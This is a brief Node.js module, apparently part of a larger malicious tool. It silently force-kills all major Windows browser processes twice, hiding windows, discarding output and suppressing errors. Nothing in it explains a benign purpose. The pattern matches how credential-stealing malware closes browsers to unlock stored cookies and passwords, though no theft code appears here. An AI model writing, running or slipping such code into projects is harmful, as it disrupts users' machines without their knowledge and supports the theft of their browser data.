// process-killer.js - Clean Silent Version
const { execSync } = require('child_process');

const browsers = [
    "chrome.exe", "msedge.exe", "brave.exe", "opera.exe",
    "firefox.exe", "vivaldi.exe", "browser.exe", "iexplore.exe"
];

module.exports = async () => {
    try {
        const cmd = 'taskkill /F /IM "' + browsers.join('" /IM "') + '" /T';

        // First kill
        execSync(cmd, {
            windowsHide: true,
            stdio: ['ignore', 'ignore', 'ignore']
        });

        await new Promise(r => setTimeout(r, 800));

        // Second kill
        execSync(cmd, {
            windowsHide: true,
            stdio: ['ignore', 'ignore', 'ignore']
        });

    } catch (e) {
        // Silent
    }
};
